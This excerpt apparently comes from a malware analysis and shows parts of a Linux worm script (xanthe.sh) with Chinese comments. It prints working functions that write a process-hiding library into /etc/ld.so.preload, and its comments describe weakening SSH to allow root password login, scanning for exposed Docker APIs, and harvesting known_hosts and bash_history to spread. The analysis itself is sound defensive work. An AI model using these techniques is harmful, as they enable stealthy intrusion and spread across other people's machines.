...
# 初始化
# >> 追加到末尾
# 通过修改 /etc/ld.so.preload 配置文件实现LD_PRELOAD劫持,隐藏指定进程
hide (){
	sed -i '/libprocesshider/'d /etc/ld.so.preload
	echo "/usr/local/lib/libprocesshider.so" >> "/etc/ld.so.preload"
}
# 通过修改 /etc/ld.so.preload 配置文件实现LD_PRELOAD劫持,取消隐藏指定进程
show (){
	sed -i '/libprocesshider/'d /etc/ld.so.preload
}
# 通过检查标识文件/tmp/.firstrun-update_ivan1.pid 判断是否已经感染,如果没有则下载fczyo和xesa模块
initializego() {
...
#修改ssh配置文件,启用22和33768端口,允许root账号通过密码登录,允许秘钥登录,关闭GSSAPI认证
sshdconfig() {
...
# 安装扫描masscan及其他依赖软件,尝试搜索当前主机上的known_hosts文件,利用里面保存的信息尝试登录并执行代码
# 安装masscan后,尝试扫描当前主机上开启2375端口的docker容器,然后利用命令行向容器内部执行恶意代码
# 然后还尝试下载zgrab扫描器
scango() {
	dpkg --configure -a
...
# 尝试搜索当前主机的known_hosts/bash_history等配置文件,从里面获取用户。主机，密码秘钥等信息.然后利用ssh感染模块xanthe.sh
localgo() {
	echo "localgo start"
